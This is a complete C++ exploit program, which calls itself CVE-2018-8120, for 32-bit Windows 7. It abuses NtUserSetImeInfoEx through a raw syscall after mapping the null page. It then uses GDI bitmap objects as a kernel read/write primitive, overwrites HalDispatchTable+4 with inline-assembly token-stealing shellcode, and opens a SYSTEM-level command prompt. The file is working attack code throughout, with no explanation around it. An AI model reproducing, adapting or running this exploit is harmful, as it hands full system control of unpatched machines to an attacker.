#include <iostream>
#include <Windows.h>
#include <Psapi.h>
using namespace std;

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID
HBITMAP hWorker = NULL;
HBITMAP hManager = NULL;

typedef struct
{
	ULONG pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	ULONG pUserAddress;
} GDICELL_32, * PGDICELL_32;

typedef struct _tagIMEINFO {
	DWORD dwPrivateDataSize;
	DWORD fdwProperty;
	DWORD fdwConversionCaps;
	DWORD fdwSentenceCaps;
	DWORD fdwUICaps;
	DWORD fdwSCSCaps;
	DWORD fdwSelectCaps;
}tagIMEINFO, *PtagIMEINFO;

typedef struct _tagIMEINFOEX {
	HKL hkl;
	tagIMEINFO ImeInfo;
	WCHAR wszUIClass[16];
	DWORD fdwInitConvMode;
	BOOL fInitOpen;
	BOOL fLoadFlag;
	DWORD dwProdVersion;
	DWORD dwImeWinVersion;
	WCHAR wszImeDescription[50];
	WCHAR wszImeFile[80];
	CHAR fSysWow64Only : 1;
	BYTE fCUASLayer : 1;
}tagIMEINFOEX, *PtagIMEINFOEX;

typedef NTSTATUS(WINAPI* xxNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PULONG   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);

typedef NTSTATUS(WINAPI* xxNtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

void TokenStealingPayloadWin7Generic() {
	// No Need of Kernel Recovery as we are not corrupting anything
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state
	}
}

static BOOL __declspec(naked)
xxNtUserSetImeInfoEx(tagIMEINFOEX* imeInfoEx) {
	__asm {mov eax, 1226h};
	__asm {lea edx, [esp + 4]};
	__asm {int 2eh};
	__asm {ret};
}

static VOID MappNullPage(void) {
	xxNtAllocateVirtualMemory NtAllocateVirtualMemory = (xxNtAllocateVirtualMemory)GetProcAddress(
		LoadLibrary(TEXT("ntdll.dll")), "NtAllocateVirtualMemory"
	);
	if (NtAllocateVirtualMemory == NULL) {
		cout << "[-] NtAllocateVirtualMemory Failed.\n";
		cout << "[-] Exiting with Error Code : " << GetLastError() << endl;
		exit(-1);
	}

	cout << "[+] Resolved NtAllocateVirtualMemory at address " << hex << NtAllocateVirtualMemory << endl;

	SIZE_T Size = 0x1000;
	PVOID BaseAddress = (PVOID)1;
	NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &BaseAddress, 0, &Size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	cout << "[+] Successfully Mapped Null Page.\n";
}

LPVOID NtkrnlpaBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		GetDeviceDriverBaseNameA(lpImageBase[i], reinterpret_cast<LPSTR>(lpfileName), 48);

		if (!strcmp(reinterpret_cast<LPSTR>(lpfileName), "ntkrnlpa.exe"))
		{
			printf("[+] success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD32 GetHalOffset_4(){
	PVOID pNtkrnlpaBase = NtkrnlpaBase();

	printf("[+] ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

	HMODULE hUserSpaceBase = LoadLibrary(L"ntkrnlpa.exe");

	if (hUserSpaceBase == NULL)
	{
		printf("[+] Failed to get hUserSpaceBase !\n");
		system("pause");
		return 0;
	}

	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	if (pUserSpaceAddress == NULL)
	{
		printf("[+] Failed to get pUserSpaceAddress !\n");
		system("pause");
		return 0;
	}

	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;

	printf("[+] HalDispatchTable+0x4 is 0x%p\n", hal_4);

	return (DWORD32)hal_4;
}

DWORD32 GetPeb(void) {
	DWORD32 Teb = (DWORD32)NtCurrentTeb();
	DWORD32 Peb = *(PDWORD32)((PUCHAR)Teb + 0x30);
	return Peb;
}

DWORD32 GetGdiSharedHandleTable(void) {
	DWORD32 Peb = GetPeb();
	DWORD32 SharedHandleTable = *(PDWORD32)((PUCHAR)Peb + 0x094);
	return SharedHandleTable;
}

DWORD GetBitmapAddress(HANDLE handle) {
	return *(PDWORD)(GetGdiSharedHandleTable() + LOWORD(handle) * sizeof(GDICELL_32));
}

VOID write(DWORD32 Address, LPVOID Buffer, int len) {
	SetBitmapBits(hManager, len, &Address);
	SetBitmapBits(hWorker, len, &Buffer);
}

VOID Trigger_Vuln(void) {
	HWINSTA hSta = CreateWindowStation(0, 0, READ_CONTROL, 0);
	cout << "[+] Window Station created successfully.\n";

	SetProcessWindowStation(hSta);

	CHAR buffer[0x64 * 0x64 * 4];
	hWorker = CreateBitmap(0x120, 10, 1, 4, &buffer);
	hManager = CreateBitmap(0x120, 10, 1, 4, &buffer);

	cout << "[+] Created hWorker with value  : " << hex << hWorker << endl;
	cout << "[+] Created hManager with value : " << hex << hManager << endl;

	DWORD WorkerAddress = GetBitmapAddress(hWorker);
	DWORD ManagerAddress = GetBitmapAddress(hManager);
	cout << "[+] Worker is at address : " << hex << WorkerAddress << endl;
	cout << "[+] Manager is at address : " << hex << ManagerAddress << endl;

	DWORD ManagerPvScan0 = ManagerAddress + 0x30;
	DWORD WorkerPvScan0 = WorkerAddress + 0x30;
	cout << "[+] Manager PvScan0 is at address : " << hex << ManagerPvScan0 << endl;
	cout << "[+] Worker PvScan0 is at address : " << hex << WorkerPvScan0 << endl;

	tagIMEINFOEX piiex = { 0 };
	*(DWORD*)((PBYTE)& piiex + 0x0) = WorkerPvScan0;
	*(DWORD*)((PBYTE)& piiex + 0x4) = 0x104;
	*(DWORD*)((PBYTE)& piiex + 0x8) = 0x00001b97;
	*(DWORD*)((PBYTE)& piiex + 0xC) = 0x00000003;
	*(DWORD*)((PBYTE)& piiex + 0x10) = 0x00010000;
	*(DWORD*)((PBYTE)& piiex + 0x18) = 0x04800200;

	DWORD* tagKl = 0x0;
	*(DWORD*)((PUCHAR)tagKl + 0x14) = WorkerPvScan0;
	*(DWORD*)((PUCHAR)tagKl + 0x2c) = ManagerPvScan0;
	cout << "[+] tagKl is at address : " << hex << tagKl << endl;

	xxNtUserSetImeInfoEx(&piiex);

	DWORD32 HalDipatchTablePlus4 = GetHalOffset_4();
	DWORD var = 0;

	xxNtQueryIntervalProfile NtQueryIntervalProfile = (xxNtQueryIntervalProfile)GetProcAddress(
		LoadLibrary(TEXT("ntdll.dll")), "NtQueryIntervalProfile"
	);
	if (NtQueryIntervalProfile == NULL) {
		cout << "[-] NtQueryIntervalProfile Failed.\n";
		exit(-1);
	}
	write(HalDipatchTablePlus4, (PVOID)&TokenStealingPayloadWin7Generic, sizeof(DWORD32));
	NtQueryIntervalProfile(0x1337, &var);
	
	CloseWindowStation(hSta);
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main(void) {
	cout << "[+] CVE-2018-8120 Exploit.\n";
	MappNullPage();
	Trigger_Vuln();
	CreateCmd();
	system("pause");
	return 0;
}